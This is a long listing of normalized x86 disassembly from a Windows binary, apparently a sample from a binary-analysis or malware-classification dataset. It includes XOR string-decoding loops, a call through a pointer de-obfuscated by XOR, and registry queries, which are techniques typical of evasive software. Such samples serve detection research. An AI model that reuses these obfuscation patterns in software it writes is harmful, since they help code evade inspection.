mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_10055110
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x230 ]
push ebx
push ecx
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x230 ]
call sub_10036cc0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x238 ]
mov [ ebp - 0x238 ] ebx
mov [ ebp - 0x234 ] ebx
call sub_10023120
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x238 ] ebx
jne r-xdata
push 0x1
call sub_1001f84c
add esp 0x4
push eax
lea ecx [ ebp - 0x240 ]
mov [ ebp - 0x240 ] ebx
mov [ ebp - 0x23c ] ebx
call sub_10052fd0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x240 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x234 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x230 ]
push ecx
lea ecx [ ebp - 0x238 ]
call sub_1000b470
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov ebx [ ebp - 0x238 ]
call sub_1000aaa0
test eax eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea esi [ ebx + 0xe8 ]
lea edx [ ebp - 0x244 ]
mov eax 0x90
add ebx 0x104
call sub_10045930
lea edx [ ebp - 0x24 ]
mov eax 0x3e
call sub_10045930
fld [ ebp + 0x8 ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006f30
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub esp 0x8
lea edx [ ebp - 0x24 ]
fstp [ esp ]
push edx
lea eax [ ebp - 0x18 ]
push eax
mov edx 0x4
call sub_10072780
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
sub esp 0x8
lea ecx [ ebp - 0x24 ]
fstp [ esp ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
mov edx 0x4
call sub_10072780
add esp 0x10
lea edx [ ebp - 0x18 ]
fstp st0
lea edx [ ebp - 0x244 ]
jmp r-xdata
push esi
call sub_100453a0
fld [ ebp + 0xc ]
fld [ r--data ]
fsubr st1
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fabs
fstp [ ebp - 0x14 ]
fld [ ebp - 0x14 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x5
jpe r-xdata
call sub_10006f30
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
xor eax eax
call sub_10006f30
lea eax [ ebp - 0x238 ]
mov [ ebp - 0x4 ] edi
call sub_10006f30
mov eax 0x6
jmp r-xdata
push ebx
call sub_100453a0
lea ecx [ ebp - 0x238 ]
call sub_100534d0
test eax eax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x240 ]
je r-xdata
sub_1005601d
push 0x8
push r--data
call sub_1007fb20
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1007fb65
retn
push 0xd
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100560ca
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_10035d06
pop ecx
push 0xc
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_10070772
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100560d6
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10035d06
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_10006356
pop ecx
sub_100560e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008980f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x68
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x3e ] ax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x4d
and edx 0xff
mov [ ebp + eax * 2 - 0x70 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc8
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc2
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff88
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0x15
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x72 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffae
and edx 0xff
mov [ ebp + eax * 2 - 0x180 ] dx
inc eax
cmp eax 0x52
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xdc ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa6
and edx 0xff
mov [ ebp + eax * 2 - 0xd8 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
xor eax eax
push 0xc
lea esi [ ebp - 0x3dc ]
mov [ ebp - 0x9e ] ax
call sub_10045cc0
add esp 0x4
mov edi eax
push 0xe
lea esi [ ebp - 0x414 ]
mov [ ebp - 0x4 ] ebx
call sub_10045cc0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x430 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0x3a4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10057920
mov edi 0x8
cmp [ ebp - 0x41c ] edi
jb r-xdata
mov esi 0x7
xor edx edx
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x420 ] ebx
mov [ ebp - 0x430 ] dx
cmp [ ebp - 0x400 ] edi
jb r-xdata
mov ecx [ ebp - 0x430 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x400 ] esi
mov [ ebp - 0x404 ] ebx
mov [ ebp - 0x414 ] cx
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x3c8 ] edi
jb r-xdata
mov eax [ ebp - 0x414 ]
push eax
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0x9c ]
xor eax eax
mov [ ebp - 0x3c8 ] esi
mov esi [ ebp - 0x394 ]
push ecx
mov [ ebp - 0x3cc ] ebx
mov [ ebp - 0x3dc ] ax
call [ lstrlenW@IAT ]
lea ebx [ eax + esi + 0x1 ]
mov esi [ GetProcessHeap@IAT ]
lea edx [ ebx + ebx ]
push edx
push edi
call esi
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x4b8 ] edi
test edi edi
je r-xdata
mov edx [ ebp - 0x3dc ]
push edx
call sub_100187af
add esp 0x4
cmp [ ebp - 0x390 ] 0x8
jb r-xdata
cmp [ ebp - 0x390 ] 0x8
mov eax [ ebp - 0x3a4 ]
jae r-xdata
xor eax eax
mov eax [ ebp - 0x3a4 ]
push eax
call sub_100187af
add esp 0x4
jmp r-xdata
push eax
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx ebx
mov ebx edi
call sub_1002cb70
add esp 0x8
push 0x144
xor ebx ebx
push ebx
call esi
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4c0 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x3a4 ]
xor eax eax
push eax
call sub_10055110
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x388 ]
push ebx
push ecx
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x388 ]
call sub_10036cc0
test eax eax
je r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0x6
mov esi [ ebp - 0x4a4 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0x6
push eax
lea ecx [ ebp - 0x4a8 ]
mov [ ebp - 0x4a8 ] ebx
mov [ ebp - 0x4a4 ] ebx
call sub_10023120
mov [ ebp - 0x4 ] 0x8
cmp [ ebp - 0x4a8 ] ebx
jne r-xdata
push 0x1
call sub_1001f84c
add esp 0x4
push eax
lea ecx [ ebp - 0x4b0 ]
mov [ ebp - 0x4b0 ] ebx
mov [ ebp - 0x4ac ] ebx
call sub_10052fd0
mov [ ebp - 0x4 ] 0x9
cmp [ ebp - 0x4b0 ] ebx
jne r-xdata
push edi
push ebx
call esi
push eax
call [ HeapFree@IAT ]
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10006f30
cmp [ ebp - 0x390 ] 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
lea eax [ ebp - 0x388 ]
push eax
lea ecx [ ebp - 0x4a8 ]
call sub_1000b470
test eax eax
jne r-xdata
push edi
push ebx
jmp r-xdata
mov edx [ ebp - 0x3a4 ]
push edx
call sub_100187af
add esp 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x4a8 ]
mov eax ebx
call sub_1000a500
test eax eax
jne r-xdata
call esi
push eax
call [ HeapFree@IAT ]
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
push edi
push 0x0
mov eax [ ebx + 0x128 ]
mov [ ebp - 0x4bc ] eax
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
lea esi [ ebp - 0x3f8 ]
call sub_10045cc0
add esp 0x4
lea edx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0x3e8 ]
push edx
call [ lstrlenW@IAT ]
lea esi [ eax + esi + 0x1 ]
lea eax [ esi + esi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
mov ecx esi
call sub_1002cb70
add esp 0x8
push ebx
lea ecx [ ebp - 0x4a0 ]
call sub_10054d00
mov [ ebp - 0x4b4 ] eax
push edi
lea ecx [ ebp - 0x484 ]
mov [ ebp - 0x4 ] 0xb
call sub_10054d00
push eax
lea edx [ ebp - 0x54 ]
lea esi [ ebp - 0x468 ]
mov [ ebp - 0x4 ] 0xc
call sub_1005bbc0
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x4b4 ]
lea edi [ ebp - 0x44c ]
mov [ ebp - 0x4 ] 0xd
call sub_10057920
push eax
lea edx [ ebp - 0x24 ]
lea esi [ ebp - 0x3c0 ]
mov [ ebp - 0x4 ] 0xe
call sub_1001ccb0
add esp 0x4
mov ecx edi
call sub_10019100
lea ecx [ ebp - 0x468 ]
call sub_10019100
lea ecx [ ebp - 0x484 ]
call sub_10019100
lea ecx [ ebp - 0x4a0 ]
mov [ ebp - 0x4 ] 0x13
call sub_10019100
mov eax [ ebp - 0x4b8 ]
mov edi [ GetProcessHeap@IAT ]
push eax
push 0x0
call edi
mov esi [ HeapFree@IAT ]
push eax
call esi
push ebx
push 0x0
call edi
push eax
call esi
lea esp [ esp ]
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x3f8 ]
call sub_10019100
jmp r-xdata
lea ecx [ ebp - 0x3c0 ]
call sub_10019100
lea ecx [ ebp - 0x3f8 ]
call sub_10019100
jmp r-xdata
mov ecx [ ebp - 0x4cc ]
movzx edx [ ebp - 0x4c8 ]
mov eax [ ebp - 0x4c4 ]
push ecx
mov ecx [ ebp - 0x4c0 ]
push edx
mov edx [ ebp - 0x4b4 ]
push eax
push ecx
push edx
push ebx
lea eax [ ebp - 0x180 ]
push eax
mov ecx edi
mov ebx esi
call sub_1002cb70
add esp 0x1c
lea ecx [ ebp - 0x3c0 ]
push ecx
mov edx esi
call sub_10010a30
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0x4bc ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4bc ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x4bc ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x1c ]
mov edi [ eax + 0xc ]
mov ebx [ eax + 0x4 ]
mov esi [ lstrlenW@IAT ]
mov [ ebp - 0x4b4 ] edx
mov edx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
push ecx
mov [ ebp - 0x4c0 ] edi
mov [ ebp - 0x4c4 ] ecx
mov [ ebp - 0x4c8 ] edx
mov [ ebp - 0x4cc ] eax
call esi
push edi
mov edi eax
call esi
mov ecx [ ebp - 0x4b4 ]
push ecx
add edi eax
call esi
push ebx
add edi eax
call esi
lea edx [ ebp - 0x180 ]
push edx
add edi eax
call esi
lea edi [ eax + edi + 0x7 ]
lea eax [ edi + edi ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x3c0 ]
push eax
lea edx [ ebp - 0x3c ]
call sub_10010a30
lea ecx [ ebp - 0x3c0 ]
push ecx
lea edx [ ebp - 0x70 ]
call sub_10010a30
mov edx [ ebp - 0x3b0 ]
lea eax [ edx + edx + 0x2 ]
push eax
mov ebx 0x8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c0 ]
cmp [ ebp - 0x3ac ] ebx
jae r-xdata
lea ecx [ ebp - 0x3c0 ]
call sub_10019100
lea ecx [ ebp - 0x3f8 ]
call sub_10019100
mov [ ebp - 0x4 ] bl
jmp r-xdata
push eax
push esi
call [ StrCpyW@IAT ]
lea ecx [ ebp - 0x3c0 ]
call sub_10019100
lea ecx [ ebp - 0x3f8 ]
call sub_10019100
lea eax [ ebp - 0x4b0 ]
mov [ ebp - 0x4 ] bl
call sub_10006f30
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10006f30
lea ecx [ ebp - 0x3a4 ]
call sub_10019100
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x3c0 ]
lea eax [ ebp - 0x4b0 ]
call sub_10006f30
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10006f30
lea ecx [ ebp - 0x3a4 ]
call sub_10019100
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10056878
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_10056a70
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov eax [ ecx + 0x10 ]
push edi
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
cmp esi edi
ja r-xdata
mov eax 0x1
sub eax esi
add edi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
movzx edx [ ebx ]
mov edi edi
mov [ ebp - 0x4 ] eax
mov ecx edi
test edi edi
je r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx ebx
mov ecx eax
test esi esi
je r-xdata
cmp [ eax ] dx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov bx [ ecx ]
cmp bx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ecx ]
sbb edx edx
and edx 0xfffffffe
inc edx
je r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp - 0x4 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
sub_10056b30
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x2c ] edx
xor eax eax
push edi
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
nop
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xe
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0x11
jb r-xdata
xor eax eax
inc eax
cmp eax 0xf
jb r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
mov edi [ edx + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov edi [ edx + 0xc ]
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push esi
push eax
mov [ ebx + 0x4 ] eax
call sub_1007f5d0
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x4 ] 0x0
mov edi [ edx + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea ecx [ esi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x8 ] eax
call sub_1007f5d0
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x8 ] 0x0
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0x10 ]
mov [ ebx + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x18 ]
mov [ ebx + 0x18 ] ecx
mov eax [ eax + 0x20 ]
pop edi
pop esi
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea edx [ esi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0xc ] eax
call sub_1007f5d0
mov edx [ ebp - 0x2c ]
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov [ ebx + 0x20 ] eax
inc [ eax + 0x1c ]
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebx + 0x1c ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0x1c ] 0x0
sub_10056cc0
push ebp
mov ebp esp
sub esp 0x14
mov edx [ rw-data ]
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov al 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x4 ] ecx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x8
sub_10056d10
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10056d40
push ebp
mov ebp esp
push 0xffffffff
push sub_10087eab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x324
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push eax
xor ebx ebx
push ecx
lea edx [ ebp - 0x324 ]
mov [ ebp - 0x32c ] ebx
push edx
mov [ ebp - 0x324 ] ebx
call sub_10042920
add esp 0xc
test eax eax
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x9e
call sub_10045930
lea edx [ ebp - 0xfc ]
mov eax 0xe5
call sub_10045930
lea edx [ ebp - 0x328 ]
push edx
push 0x1
push ebx
lea eax [ ebp - 0xfc ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x324 ]
mov [ ebp - 0x320 ] ax
mov eax edx
mov [ ebp - 0x30c ] 0x7
mov [ ebp - 0x310 ] ebx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x304 ]
[ edi ]
lea edx [ ebp - 0x2c ]
mov eax 0x9d
mov [ ebp - 0x32c ] 0x206
call sub_10045930
lea eax [ ebp - 0x32c ]
push eax
mov eax [ ebp - 0x328 ]
lea ecx [ ebp - 0x304 ]
push ecx
push ebx
push ebx
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x84 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x320 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x324 ]
push ecx
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x320 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_100649e0
